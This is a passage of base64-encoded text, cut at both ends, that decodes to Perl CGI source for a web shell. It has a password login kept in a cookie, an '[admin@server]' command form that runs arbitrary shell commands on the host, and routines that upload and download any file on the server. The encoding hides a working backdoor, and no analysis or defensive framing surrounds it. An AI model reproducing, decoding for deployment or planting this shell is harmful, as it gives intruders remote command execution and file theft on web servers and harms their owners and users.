0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHRvIGxvZ2luIHRoZSB1c2VyLiBJZiB0aGUgcGFzc3dvcmQgbWF0Y2hlcywgaXQNCiMgZGlzcGxheXMgYSBwYWdlIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIHJ1biBjb21tYW5kcy4gSWYgdGhlIHBhc3N3b3JkIGRvZW5zJ3QNCiMgbWF0Y2ggb3IgaWYgbm8gcGFzc3dvcmQgaXMgZW50ZXJlZCwgaXQgZGlzcGxheXMgYSBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyDQojIHRvIGxvZ2luDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUGVyZm9ybUxvZ2luIA0Kew0KaWYoJExvZ2luUGFzc3dvcmQgZXEgJFBhc3N3b3JkKSAjIHBhc3N3b3JkIG1hdGNoZWQNCnsNCnByaW50ICJTZXQtQ29va2llOiBTQVZFRFBXRD0kTG9naW5QYXNzd29yZDtcbiI7DQomUHJpbnRQYWdlSGVhZGVyKCJjIik7DQomUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCiZQcmludFBhZ2VGb290ZXI7DQp9DQplbHNlICMgcGFzc3dvcmQgZGlkbid0IG1hdGNoDQp7DQomUHJpbnRQYWdlSGVhZGVyKCJwIik7DQomUHJpbnRMb2dpblNjcmVlbjsNCmlmKCRMb2dpblBhc3N3b3JkIG5lICIiKSAjIHNvbWUgcGFzc3dvcmQgd2FzIGVudGVyZWQNCnsNCiZQcmludExvZ2luRmFpbGVkTWVzc2FnZTsNCg0KfQ0KJlByaW50TG9naW5Gb3JtOw0KJlByaW50UGFnZUZvb3RlcjsNCn0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byBlbnRlciBjb21tYW5kcw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50Q29tbWFuZExpbmVJbnB1dEZvcm0NCnsNCiRQcm9tcHQgPSAkV2luTlQgPyAiJEN1cnJlbnREaXI+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkQ3VycmVudERpcl1cJCAiOw0KcHJpbnQgPDxFTkQ7DQo8Y29kZT4NCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImNvbW1hbmQiPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIj4NCiRQcm9tcHQNCjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJjIj4NCjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJFbnRlciI+DQo8L2Zvcm0+DQo8L2NvZGU+DQoNCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIGRvd25sb2FkIGZpbGVzDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRGaWxlRG93bmxvYWRGb3JtDQp7DQokUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50RGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsNCnByaW50IDw8RU5EOw0KPGNvZGU+DQo8Zm9ybSBuYW1lPSJmIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iZG93bmxvYWQiPg0KJFByb21wdCBkb3dubG9hZDxicj48YnI+DQpGaWxlbmFtZTogPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImYiIHNpemU9IjM1Ij48YnI+PGJyPg0KRG93bmxvYWQ6IDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+DQo8L2Zvcm0+DQo8L2NvZGU+DQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byB1cGxvYWQgZmlsZXMNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludEZpbGVVcGxvYWRGb3JtDQp7DQokUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50RGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsNCnByaW50IDw8RU5EOw0KPGNvZGU+DQoNCjxmb3JtIG5hbWU9ImYiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KJFByb21wdCB1cGxvYWQ8YnI+PGJyPg0KRmlsZW5hbWU6IDxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmIiBzaXplPSIzNSI+PGJyPjxicj4NCk9wdGlvbnM6ICZuYnNwOzxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0ibyIgdmFsdWU9Im92ZXJ3cml0ZSI+DQpPdmVyd3JpdGUgaWYgaXQgRXhpc3RzPGJyPjxicj4NClVwbG9hZDombmJzcDsmbmJzcDsmbmJzcDs8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iQmVnaW4iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJ1cGxvYWQiPg0KPC9mb3JtPg0KPC9jb2RlPg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdGltZW91dCBmb3IgYSBjb21tYW5kIGV4cGlyZXMuIFdlIG5lZWQgdG8NCiMgdGVybWluYXRlIHRoZSBzY3JpcHQgaW1tZWRpYXRlbHkuIFRoaXMgZnVuY3Rpb24gaXMgdmFsaWQgb25seSBvbiBVbml4LiBJdCBpcw0KIyBuZXZlciBjYWxsZWQgd2hlbiB0aGUgc2NyaXB0IGlzIHJ1bm5pbmcgb24gTlQuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQ29tbWFuZFRpbWVvdXQNCnsNCmlmKCEkV2luTlQpDQp7DQphbGFybSgwKTsNCnByaW50IDw8RU5EOw0KPC94bXA+DQoNCjxjb2RlPg0KQ29tbWFuZCBleGNlZWRlZCBtYXhpbXVtIHRpbWUgb2YgJENvbW1hbmRUaW1lb3V0RHVyYXRpb24gc2Vjb25kKHMpLg0KPGJyPktpbGxlZCBpdCENCkVORA0KJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQomUHJpbnRQYWdlRm9vdGVyOw0KZXhpdDsNCn0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB0byBleGVjdXRlIGNvbW1hbmRzLiBJdCBkaXNwbGF5cyB0aGUgb3V0cHV0IG9mIHRoZQ0KIyBjb21tYW5kIGFuZCBhbGxvd3MgdGhlIHVzZXIgdG8gZW50ZXIgYW5vdGhlciBjb21tYW5kLiBUaGUgY2hhbmdlIGRpcmVjdG9yeQ0KIyBjb21tYW5kIGlzIGhhbmRsZWQgZGlmZmVyZW50bHkuIEluIHRoaXMgY2FzZSwgdGhlIG5ldyBkaXJlY3RvcnkgaXMgc3RvcmVkIGluDQojIGFuIGludGVybmFsIHZhcmlhYmxlIGFuZCBpcyB1c2VkIGVhY2ggdGltZSBhIGNvbW1hbmQgaGFzIHRvIGJlIGV4ZWN1dGVkLiBUaGUNCiMgb3V0cHV0IG9mIHRoZSBjaGFuZ2UgZGlyZWN0b3J5IGNvbW1hbmQgaXMgbm90IGRpc3BsYXllZCB0byB0aGUgdXNlcnMNCiMgdGhlcmVmb3JlIGVycm9yIG1lc3NhZ2VzIGNhbm5vdCBiZSBkaXNwbGF5ZWQuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgRXhlY3V0ZUNvbW1hbmQNCnsNCmlmKCRSdW5Db21tYW5kID1+IG0vXlxzKmNkXHMrKC4rKS8pICMgaXQgaXMgYSBjaGFuZ2UgZGlyIGNvbW1hbmQNCnsNCiMgd2UgY2hhbmdlIHRoZSBkaXJlY3RvcnkgaW50ZXJuYWxseS4gVGhlIG91dHB1dCBvZiB0aGUNCiMgY29tbWFuZCBpcyBub3QgZGlzcGxheWVkLg0KDQokT2xkRGlyID0gJEN1cnJlbnREaXI7DQokQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuImNkICQxIi4kQ21kU2VwLiRDbWRQd2Q7DQpjaG9wKCRDdXJyZW50RGlyID0gYCRDb21tYW5kYCk7DQomUHJpbnRQYWdlSGVhZGVyKCJjIik7DQokUHJvbXB0ID0gJFdpbk5UID8gIiRPbGREaXI+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkT2xkRGlyXVwkICI7DQpwcmludCAiJFByb21wdCAkUnVuQ29tbWFuZCI7DQp9DQplbHNlICMgc29tZSBvdGhlciBjb21tYW5kLCBkaXNwbGF5IHRoZSBvdXRwdXQNCnsNCiZQcmludFBhZ2VIZWFkZXIoImMiKTsNCiRQcm9tcHQgPSAkV2luTlQgPyAiJEN1cnJlbnREaXI+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkQ3VycmVudERpcl1cJCAiOw0KcHJpbnQgIiRQcm9tcHQgJFJ1bkNvbW1hbmQ8eG1wPiI7DQokQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuJFJ1bkNvbW1hbmQuJFJlZGlyZWN0b3I7DQppZighJFdpbk5UKQ0Kew0KJFNJR3snQUxSTSd9ID0gXCZDb21tYW5kVGltZW91dDsNCmFsYXJtKCRDb21tYW5kVGltZW91dER1cmF0aW9uKTsNCn0NCmlmKCRTaG93RHluYW1pY091dHB1dCkgIyBzaG93IG91dHB1dCBhcyBpdCBpcyBnZW5lcmF0ZWQNCnsNCiR8PTE7DQokQ29tbWFuZCAuPSAiIHwiOw0Kb3BlbihDb21tYW5kT3V0cHV0LCAkQ29tbWFuZCk7DQp3aGlsZSg8Q29tbWFuZE91dHB1dD4pDQp7DQokXyA9fiBzLyhcbnxcclxuKSQvLzsNCnByaW50ICIkX1xuIjsNCn0NCiR8PTA7DQp9DQplbHNlICMgc2hvdyBvdXRwdXQgYWZ0ZXIgY29tbWFuZCBjb21wbGV0ZXMNCnsNCnByaW50IGAkQ29tbWFuZGA7DQp9DQppZighJFdpbk5UKQ0Kew0KYWxhcm0oMCk7DQp9DQpwcmludCAiPC94bXA+IjsNCn0NCiZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KJlByaW50UGFnZUZvb3RlcjsNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGRpc3BsYXlzIHRoZSBwYWdlIHRoYXQgY29udGFpbnMgYSBsaW5rIHdoaWNoIGFsbG93cyB0aGUgdXNlcg0KIyB0byBkb3dubG9hZCB0aGUgc3BlY2lmaWVkIGZpbGUuIFRoZSBwYWdlIGFsc28gY29udGFpbnMgYSBhdXRvLXJlZnJlc2gNCiMgZmVhdHVyZSB0aGF0IHN0YXJ0cyB0aGUgZG93bmxvYWQgYXV0b21hdGljYWxseS4NCiMgQXJndW1lbnQgMTogRnVsbHkgcXVhbGlmaWVkIGZpbGVuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2FkZWQNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludERvd25sb2FkTGlua1BhZ2UNCnsNCmxvY2FsKCRGaWxlVXJsKSA9IEBfOw0KaWYoLWUgJEZpbGVVcmwpICMgaWYgdGhlIGZpbGUgZXhpc3RzDQp7DQojIGVuY29kZSB0aGUgZmlsZSBsaW5rIHNvIHdlIGNhbiBzZW5kIGl0IHRvIHRoZSBicm93c2VyDQokRmlsZVVybCA9fiBzLyhbXmEtekEtWjAtOV0pLyclJy51bnBhY2soIkgqIiwkMSkvZWc7DQokRG93bmxvYWRMaW5rID0gIiRTY3JpcHRMb2NhdGlvbj9hPWRvd25sb2FkJmY9JEZpbGVVcmwmbz1nbyI7DQokSHRtbE1ldGFIZWFkZXIgPSAiPG1ldGEgSFRUUC1FUVVJVj1cIlJlZnJlc2hcIiBDT05URU5UPVwiMTsgVVJMPSREb3dubG9hZExpbmtcIj4iOw0KJlByaW50UGFnZUhlYWRlcigiYyIpOw0KcHJpbnQgPDxFTkQ7DQo8Y29kZT4NCg0KU2VuZGluZyBGaWxlICRUcmFuc2ZlckZpbGUuLi48YnI+DQpJZiB0aGUgZG93bmxvYWQgZG9lcyBub3Qgc3RhcnQgYXV0b21hdGljYWxseSwNCjxhIGhyZWY9IiREb3dubG9hZExpbmsiPkNsaWNrIEhlcmU8L2E+Lg0KRU5EDQomUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCiZQcmludFBhZ2VGb290ZXI7DQp9DQplbHNlICMgZmlsZSBkb2Vzbid0IGV4aXN0DQp7DQomUHJpbnRQYWdlSGVhZGVyKCJmIik7DQpwcmludCAiRmFpbGVkIHRvIGRvd25sb2FkICRGaWxlVXJsOiAkISI7DQomUHJpbnRGaWxlRG93bmxvYWRGb3JtOw0KJlByaW50UGFnZUZvb3RlcjsNCn0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIHJlYWRzIHRoZSBzcGVjaWZpZWQgZmlsZSBmcm9tIHRoZSBkaXNrIGFuZCBzZW5kcyBpdCB0byB0aGUNCiMgYnJvd3Nlciwgc28gdGhhdCBpdCBjYW4gYmUgZG93bmxvYWRlZCBieSB0aGUgdXNlci4NCiMgQXJndW1lbnQgMTogRnVsbHkgcXVhbGlmaWVkIHBhdGhuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIHNlbnQuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgU2VuZEZpbGVUb0Jyb3dzZXINCnsNCmxvY2FsKCRTZW5kRmlsZSkgPSBAXzsNCmlmKG9wZW4oU0VOREZJTEUsICRTZW5kRmlsZSkpICMgZmlsZSBvcGVuZWQgZm9yIHJlYWRpbmcNCnsNCmlmKCRXaW5OVCkNCnsNCmJpbm1vZGUoU0VOREZJTEUpOw0KYmlubW9kZShTVERPVVQpOw0KfQ0KJEZpbGVTaXplID0gKHN0YXQoJFNlbmRGaWxlKSlbN107DQooJEZpbGVuYW1lID0gJFNlbmRGaWxlKSA9fiBtIShbXi9eXFxdKikkITsNCnByaW50ICJDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtdW5rbm93blxuIjsNCnByaW50ICJDb250ZW50LUxlbmd0aDogJEZpbGVTaXplXG4iOw0KcHJpbnQgIkNvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPSQxXG5cbiI7DQpwcmludCB3aGlsZSg8U0VOREZJTEU+KTsNCmNsb3NlKFNFTkRGSUxFKTsNCn0NCmVsc2UgIyBmYWlsZWQgdG8gb3BlbiBmaWxlDQp7DQomUHJpbnRQYWdlSGVhZGVyKCJmIik7DQpwcmludCAiRmFpbGVkIHRvIGRvd25sb2FkICRTZW5kRmlsZTogJCEiOw0KJlByaW50RmlsZURvd25sb2FkRm9ybTsNCg0KJlByaW50UGFnZUZvb3RlcjsNCn0NCn0NCg0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIgZG93bmxvYWRzIGEgZmlsZS4gSXQgZGlzcGxheXMgYSBtZXNzYWdlDQojIHRvIHRoZSB1c2VyIGFuZCBwcm92aWRlcyBhIGxpbmsgdGhyb3VnaCB3aGljaCB0aGUgZmlsZSBjYW4gYmUgZG93bmxvYWRlZC4NCiMgVGhpcyBmdW5jdGlvbiBpcyBhbHNvIGNhbGxlZCB3aGVuIHRoZSB1c2VyIGNsaWNrcyBvbiB0aGF0IGxpbmsuIEluIHRoaXMgY2FzZSwNCiMgdGhlIGZpbGUgaXMgcmVhZCBhbmQgc2VudCB0byB0aGUgYnJvd3Nlci4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBCZWdpbkRvd25sb2FkDQp7DQojIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkDQppZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXFx8Xi46LykpIHwNCighJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXC8vKSkpICMgcGF0aCBpcyBhYnNvbHV0ZQ0Kew0KJFRhcmdldEZpbGUgPSAkVHJhbnNmZXJGaWxlOw0KfQ0KZWxzZSAjIHBhdGggaXMgcmVsYXRpdmUNCnsNCmNob3AoJFRhcmdldEZpbGUpIGlmKCRUYXJnZXRGaWxlID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87DQokVGFyZ2V0RmlsZSAuPSAkUGF0aFNlcC4kVHJhbnNmZXJGaWxlOw0KfQ0KDQppZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQ0Kew0KJlNlbmRGaWxlVG9Ccm93c2VyKCRUYXJnZXRGaWxlKTsNCn0NCmVsc2UgIyB3ZSBoYXZlIHRvIHNlbmQgb25seSB0aGUgbGluayBwYWdlDQp7DQomUHJpbnREb3dubG9hZExpbmtQYWdlKCRUYXJnZXRGaWxlKTsNCn0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB1c2VyIHdhbnRzIHRvIHVwbG9hZCBhIGZpbGUuIElmIHRoZQ0KIyBmaWxlIGlzIG5vdCBzcGVjaWZpZWQsIGl0IGRpc3BsYXlzIGEgZm9ybSBhbGxvd2luZyB0aGUgdXNlciB0byBzcGVjaWZ5IGENCiMgZmlsZSwgb3RoZXJ3aXNlIGl0IHN0YXJ0cyB0aGUgdXBsb2FkIHByb2Nlc3MuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgVXBsb2FkRmlsZQ0Kew0KIyBpZiBubyBmaWxlIGlzIHNwZWNpZmllZCwgcHJpbnQgdGhlIHVwbG9hZCBmb3JtIGFnYWluDQppZigkVHJhbnNmZXJGaWxlIGVxICIiKQ0Kew0KJlByaW50UGFnZUhlYWRlcigiZiIpOw0KJlByaW50RmlsZVVwbG9hZEZvcm07DQomUHJpbnRQYWdlRm9vdGVyOw0KcmV0dXJuOw0KfQ0KJlByaW50UGFnZUhlYWRlcigiYyIpOw0KDQojIHN0YXJ0IHRoZSB1cGxvYWRpbmcgcHJvY2Vzcw0KcHJpbnQgIlVwbG9hZGluZyAkVHJhbnNmZXJGaWxlIHRvICRDdXJyZW50RGlyLi4uPGJyPiI7DQoNCiMgZ2V0IHRoZSBmdWxsbHkgcXVhbGlmaWVkIHBhdGhuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIGNyZWF0ZWQNCmNob3AoJFRhcmdldE5hbWUpIGlmICgkVGFyZ2V0TmFtZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOw0KJFRyYW5zZmVyRmlsZSA9fiBtIShbXi9eXFxdKikkITsNCiRUYXJnZXROYW1lIC49ICRQYXRoU2VwLiQxOw0KDQokVGFyZ2V0RmlsZVNpemUgPSBsZW5ndGgoJGlueydmaWxlZGF0YSd9KTsNCiMgaWYgdGhlIGZpbGUgZXhpc3RzIGFuZCB3ZSBhcmUgbm90IHN1cHBvc2VkIHRvIG92ZXJ3cml0ZSBpdA0KaWYoLWUgJFRhcmdldE5hbWUgJiYgJE9wdGlvbnMgbmUgIm92ZXJ3cml0ZSIpDQp7DQpwcmludCAiRmFpbGVkOiBEZXN0aW5hdGlvbiBmaWxlIGFscmVhZHkgZXhpc3RzLjxicj4iOw0KfQ0KZWxzZSAjIGZpbGUgaXMgbm90IHByZXNlbnQNCnsNCmlmKG9wZW4oVVBMT0FERklMRSwgIj4kVGFyZ2V0TmFtZSIpKQ0Kew0KYmlubW9kZShVUExPQURGSUxFKSBpZiAkV2luTlQ7DQpwcmludCBVUExPQURGSUxFICRpbnsnZmlsZWRhdGEnfTsNCmNsb3NlKFVQTE9BREZJTEUpOw0KcHJpbnQgIlRyYW5zZmVyZWQgJFRhcmdldEZpbGVTaXplIEJ5dGVzLjxicj4iOw0KcHJpbnQgIkZpbGUgUGF0aDogJFRhcmdldE5hbWU8YnI+IjsNCn0NCmVsc2UNCnsNCnByaW50ICJGYWlsZWQ6ICQhPGJyPiI7DQp9DQp9DQpwcmludCAiIjsNCiZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KDQomUHJpbnRQYWdlRm9vdGVyOw0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIgd2FudHMgdG8gZG93bmxvYWQgYSBmaWxlLiBJZiB0aGUNCiMgZmlsZW5hbWUgaXMgbm90IHNwZWNpZmllZCwgaXQgZGlzcGxheXMgYSBmb3JtIGFsbG93aW5nIHRoZSB1c2VyIHRvIHNwZWNpZnkgYQ0KIyBmaWxlLCBvdGhlcndpc2UgaXQgZGlzcGxheXMgYSBtZXNzYWdlIHRvIHRoZSB1c2VyIGFuZCBwcm92aWRlcyBhIGxpbmsNCiMgdGhyb3VnaCB3aGljaCB0aGUgZmlsZSBjYW4gYmUgZG93bmxvYWRlZC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBEb3dubG9hZEZpbGUNCnsNCiMgaWYgbm8gZmlsZSBpcyBzcGVjaWZpZWQsIHByaW50IHRoZSBkb3dubG9hZCBmb3JtIGFnYWluDQppZigkVHJhbnNmZXJGaWxlIGVxICIiKQ0Kew0KJlByaW50UGFnZUhlYWRlcigiZiIpOw0KJlByaW50RmlsZURvd25sb2FkRm9ybTsNCiZQcmludFBhZ2VGb290ZXI7DQpyZXR1cm47DQp9DQoNCiMgZ2V0IGZ1bGx5IHF1YWxpZmllZCBwYXRoIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2FkZWQNCmlmKCgkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cXHxeLjovKSkgfA0KKCEkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cLy8pKSkgIyBwYXRoIGlzIGFic29sdXRlDQp7DQokVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7DQp9DQplbHNlICMgcGF0aCBpcyByZWxhdGl2ZQ0Kew0KY2hvcCgkVGFyZ2V0RmlsZSkgaWYoJFRhcmdldEZpbGUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsNCiRUYXJnZXRGaWxlIC49ICRQYXRoU2VwLiRUcmFuc2ZlckZpbGU7DQp9DQoNCmlmKCRPcHRpb25zIGVxICJnbyIpICMgd2UgaGF2ZSB0byBzZW5kIHRoZSBmaWxlDQp7DQomU2VuZEZpbGVUb0Jyb3dzZXIoJFRhcmdldEZpbGUpOw0KfQ0KZWxzZSAjIHdlIGhhdmUgdG8gc2VuZCBvbmx5IHRoZSBsaW5rIHBhZ2UNCnsNCiZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOw0KfQ0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIE1haW4gUHJvZ3JhbSAtIEV4ZWN1dGlvbiBTdGFydHMgSGVyZQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KJlJlYWRQYXJzZTsNCiZHZXRDb29raWVzOw0KDQokU2NyaXB0TG9jYXRpb24gPSAkRU5WeydTQ1JJUFRfTkFNRSd9Ow0KJFNlcnZlck5hbWUgPSAkRU5WeydTRVJWRVJfTkFNRSd9Ow0KJExvZ2luUGFzc3dvcmQgPSAkaW57J3AnfTsNCiRSdW5Db21tYW5kID0gJGlueydjJ307DQokVHJhbnNmZXJGaWxlID0gJGlueydmJ307DQokT3B0aW9ucyA9ICRpbnsnbyd9Ow0KDQokQWN0aW9uID0gJGlueydhJ307DQokQWN0aW9uID0gImxvZ2luIiBpZigkQWN0aW9uIGVxICIiKTsgIyBubyBhY3Rpb24gc3BlY2lmaWVkLCB1c2UgZGVmYXVsdA0KDQojIGdldCB0aGUgZGlyZWN0b3J5IGluIHdoaWNoIHRoZSBjb21tYW5kcyB3aWxsIGJlIGV4ZWN1dGVkDQokQ3VycmVudERpciA9ICRpbnsnZCd9Ow0KY2hvcCgkQ3VycmVudERpciA9IGAkQ21kUHdkYCkgaWYoJEN1cnJlbnREaXIgZXEgIiIpOw0KDQokTG9nZ2VkSW4gPSAkQ29va2llc3snU0FWRURQV0QnfSBlcSAkUGFzc3dvcmQ7DQoNCmlmKCRBY3Rpb24gZXEgImxvZ2luIiB8fCAhJExvZ2dlZEluKSAjIHVzZXIgbmVlZHMvaGFzIHRvIGxvZ2luDQp7DQomUG